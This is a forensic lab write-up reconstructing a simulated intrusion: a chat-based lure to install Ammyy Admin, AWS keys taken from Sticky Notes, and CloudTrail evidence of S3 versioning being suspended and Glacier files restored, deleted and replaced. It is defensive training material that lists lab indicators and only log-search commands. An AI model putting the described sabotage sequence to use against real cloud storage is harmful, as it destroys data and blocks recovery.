This repository holds sensitive information, including blueprints for new toys, holiday logistics, toy production schedules, and most importantly, the coveted gift list! With Christmas preparations in full swing, any disruption to this storage could cause chaos across the entire operation, threatening to derail everyone's holiday season.

Will the holiday magic prevail, or will Christmas fall into dismay?

### Introduction to pt. 3

This part of the OpTinselTrace24 investigation focuses on the compromise of Lanny's workstation and the attacker's subsequent activity within AWS cloud storage.

Unlike the previous Sherlock, which involved investigating a vulnerable Kubernetes application, this challenge brought me back into familiar Windows forensic artifacts before introducing something I hadn't worked with before: **AWS CloudTrail logs**.

The investigation started with reconstructing a social engineering attack through IceChat conversations, identifying unauthorized remote access through Ammyy Admin, and discovering exposed AWS credentials stored in Microsoft Sticky Notes. From there, I transitioned into CloudTrail to trace the attacker's activity within the AWS environment.

CloudTrail was completely new territory for me, but one thing this investigation reinforced is that **having a strong investigative methodology makes unfamiliar artifacts much easier to approach**.

Rather than immediately searching through thousands of logs hoping to find something suspicious, I spent time understanding how CloudTrail records events, what information each event contains, and how that information is organized within the JSON structure. Once I understood fields such as `eventTime`, `eventName`, `sourceIPAddress`, and `requestParameters`, investigating the logs became much more straightforward.

I could search for specific AWS operations, filter events by the attacker's known IP address, and piece together a timeline of their activity.

This is a workflow I've found useful across almost every type of log analysis, regardless of the technology involved:

**Understand the artifact -> Identify the available fields -> Learn how the data is structured -> Search using known indicators -> Correlate events -> Reconstruct the activity**

Whether you're investigating Windows Event Logs, web server logs, EDR telemetry, or AWS CloudTrail, the general approach stays largely the same.

One thing I would strongly recommend to anyone getting into DFIR is developing their own repeatable investigative methodology. When you encounter an unfamiliar artifact, take the time to understand what it records, how the information is presented, and which fields might be useful before diving straight into searching for answers.

That initial effort can save a significant amount of time later, and more importantly, it helps you understand **why the evidence matters rather than simply knowing where to find it**.

For me, this Sherlock was a great reminder that you don't need to be an expert in every technology before you start investigating it. Having a reliable process for approaching unfamiliar evidence is often just as valuable as knowing the artifact itself.

<br>

## Initial Investigation - IceChat Conversation Logs

I started by examining the IceChat logs associated with Lanny's user account.

One conversation immediately stood out to me: `W4yne-2024-11-13.log`

The log contained a conversation between Lanny and another user named `W4yne`, who appeared to be impersonating a legitimate coworker or support contact.

During the conversation, Lanny mentioned having difficulties installing software because she did not have administrative privileges on her workstation. Rather than helping her through an approved administrative process, W4yne directed Lanny to visit: `www.ammyy[.]com`

The attacker instructed Lanny to download and execute the remote administration software, then share the connection information required to access her workstation.

The IceChat conversation between lanny and W4nye contained the following details:
- **Remote Access Tool:** `www.ammyy[.]com` (Ammyy Admin)
- **Client ID:** `95192516`
- **Session Password:** `48480`
- **Attacker IP Address:** `146.70.202[.]35`

Ammyy Admin is a legitimate remote administration tool. However, the user was explicitly instructed to provide the information required for someone else to remotely control her machine. The attacker was effectively convincing the victim to establish the remote access session on their behalf.

This activity is consistent with **MITRE ATT&CK T1219 - Remote Access Tools**, since legitimate remote administration software was being used to facilitate unauthorized access.

<br>

## Understanding Lanny's Role and Access

Before moving directly into the remote access artifacts, I reviewed Lanny's previous IceChat conversations to understand what she had been working on.

Two conversations provided particularly useful context:

In a conversation with `Patch`, Lanny mentioned being tasked with restoring **confidential AWS S3 Glacier files** and placing the restored data into a shared file directory.

Another conversation with `GrandElf` indicated that Lanny had been assigned to help with the organization's new file server.

These details became much more significant later in the investigation.

At first, they simply helped establish Lanny's responsibilities within the environment. However, they also indicated that her workstation might contain access to sensitive cloud storage resources or credentials associated with the AWS restoration process.

This gave me an additional question to investigate: **Was the attacker targeting Lanny specifically because of her involvement with the AWS archive restoration and file server operations?**

<br>

## Validating the Malicious Software Download

After identifying the URL shared by W4yne, my next priority was determining whether Lanny actually followed the attacker's instructions. For this, I examined the user's **Microsoft Edge browsing history**.

The browser artifacts confirmed that Lanny visited the website provided in the IceChat conversation and downloaded an executable named: `AA_V3.EXE`

The download occurred at: `2024-11-13 12:08` providing with the first confirmation that the social engineering attempt had progressed beyond a conversation.

I then pivoted into the **$MFT (Master File Table)** from `NORTHPOLE-LUMEN` to verify that the executable existed on the file system. The $MFT contained an entry for `AA_V3.EXE` inside Lanny's Downloads directory.

This correlation gave me two independent sources of evidence:
- **Microsoft Edge History:** Confirmed that the victim visited the website and downloaded `AA_V3.EXE`.
- **NTFS $MFT:** Confirmed the presence of the downloaded executable in the user's Downloads folder.

Together, these artifacts supported the conclusion that Lanny had downloaded the remote administration tool as instructed.

The next question was whether the attacker had successfully used it to establish a remote session.

<br>

## Confirming Unauthorized Remote Access

With `AA_V3.EXE` identified, I looked for artifacts that could establish whether Ammyy Admin had actually been used to connect to the workstation.

One particularly useful artifact was: `C:\ProgramData\Ammyy\access.log`

This log contained records associated with remote access sessions established through Ammyy Admin. While reviewing the log, I identified a session beginning at: `20241113-04:23:34.386000 0000273C`

The timestamp appeared to represent local system time. **I could not directly correlate the timestamp with the rest of the investigation without first determining the workstation's configured time zone.**

<br>

## Determining the System Time Zone

To resolve the timestamp discrepancy, I opened the workstation's `SYSTEM` registry hive using **Eric Zimmerman's Registry Explorer**.

I navigated to: `CurrentControlSet\Control\TimeZoneInformation`

The registry information identified the system's configured time zone as: `Pacific Standard Time`

Because the session occurred on November 13, 2024, after the transition from daylight saving time, Pacific local time was eight hours behind UTC.

Using this offset, I converted the Ammyy Admin session timestamp:
- **Local Time:** `2024-11-13 04:23:34`
- **Time Zone:** Pacific Standard Time (UTC-8)
- **UTC Time:** `2024-11-13 12:23:34`

**Attacker provides download URL -> victim downloads Ammyy Admin -> victim shares connection details -> remote session is established**

This was a useful example of why time zone normalization matters during forensic investigations. Without checking the registry, it would have been easy to incorrectly place the remote session several hours before the victim downloaded the software.

<br>

## Investigating Potential AWS Credential Exposure

After establishing that the attacker had gained remote access to Lanny's workstation, I shifted my focus toward determining how the attacker could have accessed the organization's AWS environment.

The earlier IceChat conversations were important here.

Lanny had been assigned to restore confidential data from AWS S3 Glacier, so I started considering where credentials or connection information associated with that task might have been stored locally.

During my review of the workstation, I noticed that Lanny had been using **Microsoft Sticky Notes**.

Sticky Notes can contain useful forensic evidence because the application stores note content inside a local SQLite database.

The relevant file was: `C:\Users\lannyl\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`

I opened `plum.sqlite` using **DB Browser for SQLite** and began inspecting the stored note contents.

One note immediately stood out because it contained what appeared to be AWS programmatic access credentials. The note included:
- **AWS Access Key ID:** `AKIA52GPOBQCBFYGAYHI`
- **AWS Secret Access Key:** Present in plaintext within the note

Finding these credentials was a significant development in my investigation.

Unlike an AWS console login, an access key ID and secret access key can be used by applications, scripts, and AWS command-line tools to authenticate programmatically, provided the credentials are valid and have the necessary permissions. If the attacker could access Lanny's desktop through Ammyy Admin, they likely had access to these locally stored credentials as well.

At this stage, I had identified a plausible credential exposure path:

**Social engineering -> unauthorized remote desktop access -> locally stored AWS credentials -> potential access to cloud resources**

The presence of the credentials on the workstation did not independently prove that the attacker copied or used them. However, it provided an explanation worth testing against AWS authentication and activity logs.

<br>

## Pivoting Into AWS CloudTrail

With a potential AWS credential exposure identified, I moved away from Windows host artifacts and into the provided AWS CloudTrail logs.

CloudTrail records activity within an AWS environment, including which actions were performed, when they occurred, which accounts were involved, and the IP addresses associated with those requests.

Since CloudTrail was a new artifact for me, I spent some time getting familiar with how the logs were structured before jumping into the investigation.

The logs were stored as compressed JSON files (.json.gz), and each event contained useful fields such as:

- `eventTime` -> When the action occurred.

- `eventName` -> What AWS action was performed, such as GetObject or DeleteObject.

- `sourceIPAddress` -> The IP address associated with the request.

- `userIdentity` -> Information about the AWS identity making the request.

- `requestParameters` -> Additional details about the request, such as the targeted bucket or file.

Once I understood how these fields were organized, searching for specific activity became much easier.

The biggest challenge was the size of the collection. There were thousands of compressed CloudTrail files, and manually opening each one wasn't going to be practical.

Luckily, I already had a useful indicator from the earlier IceChat investigation: `146.70.202.35` my goal was to determine whether this IP appeared in CloudTrail and, if it did, use those events to trace what the attacker was doing in AWS.

<br>

## Scoping CloudTrail Logs With PowerShell

Since I was investigating on Windows, I relied heavily on PowerShell as an alternative to Linux's grep to search through the CloudTrail logs.

Rather than manually reviewing thousands of JSON files, I wrote a PowerShell script to search the compressed collection for the attacker's IP address.

Once I identified which archives contained matching events, I extracted those files into a separate evidence folder. This gave me a much smaller dataset to work with.

From there, most of the investigation involved searching the extracted CloudTrail logs for specific AWS operations such as `GetObject`, `RestoreObject`, `PutObject`, and `DeleteObject`.

For anyone working on Windows, one particularly useful PowerShell cmdlet is: `Select-String`

It works similarly to grep in Linux, allowing you to search through files for specific text or patterns.

For example, to search through extracted CloudTrail JSON files for the attacker's IP address:

`Get-ChildItem "C:\Evidence\CloudTrail" -Filter *.json -Recurse | Select-String -Pattern "146.70.202.35"`

This searches all .json files in the specified directory and its subdirectories, returning any lines containing the attacker's IP address.

You can easily change the search pattern to look for specific AWS operations instead.

For example, to find events involving deleted S3 objects:

`Get-ChildItem "C:\Evidence\CloudTrail" -Filter *.json -Recurse | Select-String -Pattern '"eventName"\s*:\s*"DeleteObject"'`

This was essentially the approach I used throughout the rest of the investigation: identify the AWS operation I was interested in, search for it using PowerShell, and then examine the matching events to determine what the attacker did. One important distinction is that Select-String searches the text inside files rather than understanding the JSON structure itself. For more detailed investigations, PowerShell's ConvertFrom-Json cmdlet can be used to parse the CloudTrail records and filter individual fields more precisely.

Also, the examples above search extracted `.json` files, not compressed `.json.gz` archives. Those need to be decompressed first.

The overall workflow was fairly straightforward:

**Identify attacker IP -> Search compressed logs -> Extract matching archives -> Search for specific AWS operations -> Build attack timeline**

This was a good reminder that you don't always need specialized tools to investigate unfamiliar logs. Once you understand what information the logs contain and how it's structured, something as simple as PowerShell can be extremely useful for narrowing down suspicious activity.

More importantly, this same approach can be applied to many other types of logs, not just AWS CloudTrail.

<br>

## Identifying the Targeted AWS S3 Bucket

With the CloudTrail logs narrowed down, I started looking at what AWS resources the attacker had been interacting with.

CloudTrail records actions performed in AWS, including when they happened, what action was performed, and which IP address made the request.

For S3 activity, one useful field is `bucketName`, which identifies the storage bucket involved. After reviewing the events associated with the attacker's IP address, I identified the targeted bucket: `arctic-archive-freezer`

This was interesting because Lanny's earlier IceChat conversations mentioned that she had been assigned to restore confidential files from AWS Glacier.

At this point, I had a few pieces of evidence beginning to connect:
- IceChat showed that Lanny was working with confidential AWS files.
- Microsoft Sticky Notes contained AWS credentials stored on her workstation.
- CloudTrail showed suspicious activity involving the `arctic-archive-freezer` bucket.

The next step was figuring out which files inside the bucket the attacker was targeting.

<br>

## Identifying the Targeted Directory

After identifying the bucket, I examined the object paths recorded in the CloudTrail events. S3 doesn't use traditional folders in the same way Windows does. Instead, it stores objects using keys, which can look like normal file paths. For example: `Folder/Subfolder/file.txt`

By reviewing the object keys associated with the suspicious requests, I identified the main directory being targeted: `Claus_Operation_Data`

This helped narrow down the investigation even further. I now knew both the storage bucket and the specific group of files the attacker was interested in.

<br>

## Disabling S3 Object Versioning

One of the more suspicious actions I found was an AWS operation called: `PutBucketVersioning`

S3 Versioning is a feature that allows AWS to keep previous versions of files when they are modified or overwritten. Think of it like having older copies of a document available in case someone accidentally changes or deletes the original. For an attacker trying to destroy or corrupt files, this protection can make their job more difficult.

While reviewing `PutBucketVersioning` events, I found that the attacker changed the bucket's versioning status to: `Suspended` This occurred at: **`2024-11-13 15:31:15 UTC`**

By suspending versioning, the attacker prevented new versions from automatically being created for future changes to objects in the bucket. This would make it more difficult to recover certain files if they were subsequently overwritten or deleted. Previously saved versions would not automatically disappear, though.

This activity aligns with **MITRE ATT&CK T1490 - Inhibit System Recovery**.

It was also an important finding because it suggested the attacker wasn't simply interested in reading the archived files. They were preparing to modify or destroy them.

<br>

## Identifying the First Glacier Restore Operation

Next, I wanted to determine when the attacker began trying to access the archived files. Since these objects were stored in S3 Glacier, they needed to be restored before their contents could be accessed. The AWS operation responsible for initiating this process is: `RestoreObject`

I filtered the CloudTrail records for `RestoreObject` events associated with the attacker's IP address and sorted them by their timestamps. The first restore operation was recorded at: **`2024-11-13 15:43:49 UTC`** approximately 12 minutes after the attacker suspended S3 versioning.

<br>

## Identifying the Glacier Retrieval Tier

After finding the first `RestoreObject` event, I looked more closely at the request details. One field that stood out was: `GlacierJobParameters` This contained the retrieval tier the attacker selected when requesting the archived files. The value was: `Expedited`

AWS Glacier offers different retrieval options depending on how quickly the data needs to become available. By choosing `Expedited`, the attacker was requesting one of the fastest available restoration methods. This suggested they wanted access to the archived files as quickly as possible rather than waiting for a slower restoration process.

<br>

## Investigating Object Deletion Activity

After looking at the restore operations, I searched for evidence that the attacker had tried to delete files from the bucket.

For this, I focused on the AWS operation: `DeleteObject` this operation is used to delete objects stored in S3.

While reviewing the suspicious events, I identified a deletion attempt involving: `GiftList_Worldwide.csv` this was an important finding because it showed the attacker was doing more than requesting access to archived data. They were also attempting to remove files from the bucket.

When combined with the earlier versioning change, the activity suggested an effort to damage the stored information while making recovery more difficult.

<br>

## Determining the Size of the Targeted Data

Another part of the investigation involved determining how much data the attacker downloaded from the S3 bucket. For this, I focused on the AWS operation: `GetObject` this operation is used to retrieve or download files from an S3 bucket.

I filtered the CloudTrail logs for `GetObject` events involving the file: `Claus_Operation_Data/gift_lists/GiftList_Worldwide.csv` one useful field in these events was `bytesTransferredOut`, which records how many bytes were sent during each request.

While reviewing the results, I noticed multiple download records associated with the same file. This can happen when the AWS CLI downloads a large file in smaller chunks rather than transferring everything in a single request.

Using PowerShell, I counted the matching records and added together their `bytesTransferredOut` values to calculate the total amount of data transferred. After converting the total from bytes to megabytes (MB), I determined that the file was approximately: **`152 MB`**

<br>

## Identifying When the Attacker Began Replacing Files

After investigating the restore and delete operations, I wanted to see whether the attacker had also uploaded or overwritten anything inside the bucket.

For this, I searched for another AWS operation: `PutObject` this operation is used to upload files into an S3 bucket. If an object is uploaded using the same key as an existing file, it can replace the current version of that file, depending on the bucket's configuration.

I sorted the suspicious `PutObject` events by timestamp to identify when the first replacement occurred. The first object replacement was recorded at: **`2024-11-13 16:10:00 UTC`**

Combined with the earlier events, the sequence was beginning to make sense:

**Suspend Versioning -> Restore Archived Files -> Delete Objects -> Upload Modified Files**

Instead of just accessing confidential information, the attacker appeared to be carrying out a form of data sabotage.

<br>

## Identifying the Storage Class Used to Hide Modified Files

One final detail I investigated was how the attacker configured the files they uploaded. AWS S3 offers different storage classes, which determine how objects are stored and accessed.

While reviewing the suspicious `PutObject` requests, I examined the `StorageClass` field. The value was: `GLACIER` this was interesting because the original files were already stored in an archival environment. By uploading modified objects using the `GLACIER` storage class, the attacker kept their storage settings consistent with the surrounding archived data.

This could help the modified files blend in rather than immediately appearing unusual to someone reviewing the bucket. The storage class alone doesn't prove the attacker was intentionally hiding their activity, but it makes sense when viewed alongside the other suspicious actions.

<br>

## Attack Timeline

Based on the artifacts I reviewed, the attack can be reconstructed as follows:
- **Initial Social Engineering:** The rogue elf `W4yne` contacts Lanny through IceChat and convinces her to download Ammyy Admin.
- **Remote Access Preparation:** Lanny provides her Ammyy Admin Client ID and password to the attacker.
- **12:08 UTC - November 13, 2024:** Microsoft Edge history records the download of `AA_V3.EXE`.
- **File System Evidence:** The `NORTHPOLE-LUMEN` $MFT confirms the executable was downloaded to Lanny's workstation.
- **12:23:34 UTC:** Ammyy Admin's `access.log` records a remote access session.
- **Credential Exposure:** Microsoft Sticky Notes contains AWS credentials stored in the `plum.sqlite` database.
- **CloudTrail Investigation:** The attacker's IP address, `146.70.202.35`, appears in CloudTrail records involving AWS storage.
- **Target Identification:** The attacker targets the `arctic-archive-freezer` S3 bucket and the `Claus_Operation_Data` directory.
- **15:31:15 UTC:** The attacker uses `PutBucketVersioning` to suspend object versioning, making recovery from future changes more difficult.
- **15:43:49 UTC:** The first `RestoreObject` operation is initiated using the `Expedited` Glacier retrieval tier.
- **Object Deletion:** The attacker attempts to delete `GiftList_Worldwide.csv` using `DeleteObject`.
- **Data Size:** The targeted S3 object or transfer is identified as approximately `152 MB`.
- **16:10:00 UTC:** The first suspicious `PutObject` upload replaces an object in the targeted bucket.
- **Storage Class:** The attacker uses `GLACIER` for the uploaded files, keeping their storage settings consistent with the archived data.

<br>

## Final Assessment

OpTinselTrace24-3 was interesting because the investigation started with a simple social engineering attack but eventually led into AWS cloud forensics. The attacker didn't need to exploit a complicated vulnerability to gain access to Lanny's workstation. Instead, they used IceChat to convince her to download Ammyy Admin and share the information required to establish a remote connection.

By correlating IceChat messages, Microsoft Edge history, the $MFT, and Ammyy Admin logs, I was able to reconstruct how the attacker gained remote access. One important part of this process was checking the system's time zone through the Windows registry. This allowed me to convert the Ammyy Admin session timestamp into UTC and compare it with the other evidence.

The investigation became more interesting when I discovered AWS credentials stored inside Lanny's Microsoft Sticky Notes database. Earlier conversations had already established that Lanny was working with confidential AWS Glacier files, so finding those credentials provided a possible explanation for how the attacker could have accessed the cloud environment. From there, I moved into the AWS CloudTrail logs.

Because the collection contained thousands of compressed files, I used PowerShell to search for the attacker's IP address and extract only the matching logs. This made the investigation much easier to manage. The CloudTrail activity showed that the attacker targeted the `arctic-archive-freezer` bucket, specifically the `Claus_Operation_Data` directory.

The attacker then performed several suspicious actions:
- Suspended S3 versioning to make future file changes more difficult to recover.
- Requested expedited restoration of archived files.
- Attempted to delete `GiftList_Worldwide.csv`.
- Uploaded files that appeared to replace legitimate archived objects.
- Used the `GLACIER` storage class to keep the uploaded files consistent with the original storage configuration.

The timestamps helped establish the order of these actions and showed that this was more than someone simply browsing through an AWS bucket. The attacker appeared to be deliberately interfering with the organization's archived data.

The overall attack path can be summarized as:

**Social Engineering -> Remote Access -> Potential Credential Theft -> AWS Access -> Versioning Suspension -> Glacier Restoration -> File Deletion and Modification**

For me, the biggest takeaway from this Sherlock was learning how to connect Windows host evidence with AWS cloud activity.

The IceChat logs explained how the attacker contacted the victim. Browser history and the $MFT confirmed the software download. Ammyy Admin logs showed the remote connection, and Microsoft Sticky Notes revealed potentially exposed AWS credentials.

Finally, CloudTrail helped reconstruct what happened inside the cloud environment.

This was a good example of how an investigation can start with a single suspicious conversation and eventually uncover a much larger attack involving multiple systems and technologies.

<br>

## Key Indicators

- **Compromised User:** `lannyl`
- **Compromised Workstation:** `NORTHPOLE-LUMEN`
- **Rogue IceChat User:** `W4yne`
- **IceChat Log:** `W4yne-2024-11-13.log`
- **Attacker IP Address:** `146.70.202[.]35`
- **Social Engineering URL:** `www.ammyy[.]com`
- **Remote Access Software:** Ammyy Admin
- **Downloaded Executable:** `AA_V3.EXE`
- **Ammyy Client ID:** `95192516`
- **Remote Access Session:** `2024-11-13 12:23:34 UTC`
- **Remote Access Log:** `C:\ProgramData\Ammyy\access.log`
- **Credential Storage Artifact:** `plum.sqlite`
- **AWS Access Key ID:** `AKIA52GPOBQCBFYGAYHI`
- **Targeted S3 Bucket:** `arctic-archive-freezer`
- **Targeted Directory:** `Claus_Operation_Data`
- **Deleted File Target:** `GiftList_Worldwide.csv`
- **Relevant AWS API Operations:** `PutBucketVersioning`, `RestoreObject`, `DeleteObject`, `PutObject`
- **Glacier Retrieval Tier:** `Expedited`
- **Suspicious Versioning Status:** `Suspended`
- **Uploaded Object Storage Class:** `GLACIER`

<br>

## MITRE ATT&CK Mapping

The activity observed during the investigation included:
- **T1219 - Remote Access Tools**
  - The attacker convinced Lanny to download Ammyy Admin and share her connection details, allowing unauthorized remote access.

- **T1078.004 - Valid Accounts: Cloud Accounts**
  - AWS credentials were found on Lanny's workstation and may have been used to access cloud resources. Confirming this would require matching the credentials to CloudTrail activity.

- **T1490 - Inhibit System Recovery**
  - The attacker suspended S3 object versioning through `PutBucketVersioning`, making certain future file changes more difficult to recover.

- **T1530 - Data from Cloud Storage Object**
  - The attacker initiated restoration of archived S3 objects, potentially preparing them for retrieval. Additional download evidence would help confirm collection of the data.

Additional activity was consistent with data destruction and manipulation of cloud storage objects.

<br>

## Next Steps

If this were a real incident, my next steps would include:

- Isolate Lanny's workstation and terminate any active Ammyy Admin sessions.
- Search for other systems communicating with `146.70.202.35`.
- Determine whether W4yne contacted any other employees through IceChat.
- Revoke the exposed AWS access key and rotate any associated credentials.
- Review CloudTrail to determine which AWS account or IAM user performed the suspicious actions.
- Check whether the archived objects were actually downloaded or transferred outside the environment.
- Review all `DeleteObject` and `PutObject` activity to identify deleted or modified files.
- Compare modified files against known-good versions or backups.
- Determine whether any previous S3 object versions can still be recovered.
- Re-enable the appropriate S3 versioning configuration and review bucket permissions.
- Investigate whether additional AWS credentials were exposed on the compromised workstation.

The biggest lesson from this investigation was that **a simple social engineering attack against one workstation can potentially lead to much more serious damage elsewhere in an environment**. What started with a suspicious IceChat conversation eventually led to an investigation involving remote desktop access, exposed cloud credentials, and possible sabotage of confidential AWS data. Following the evidence across different artifacts made it possible to understand how those activities were connected.
